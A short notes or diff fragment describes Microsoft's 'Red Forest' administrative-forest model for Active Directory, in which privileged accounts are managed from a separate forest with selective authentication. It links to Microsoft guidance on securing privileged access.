+Dedicated administrative forest for managing critical assets like administrative users, groups and computers.
+Since a forest is considered a security boundary rather than a domain, this model provides enhanced security controls.
+The Administrative forest is also called the Red Forest!
+Administrative users in a production forest are used as standard non-privileged users in the administrative forest.
+Selective Authentication to the Red Forest enables stricter security controls on logon of users from non-administrative forests.
+
+Securing Prileged Access:
+https://technet.microsoft.com/en-us/windows-server-docs/security/securing-privileged-access/securing-privileged-access
+
+Microsoft Paper - Best Practices for Security Active Directory:
+http://aka.ms/bpsadtrd
+
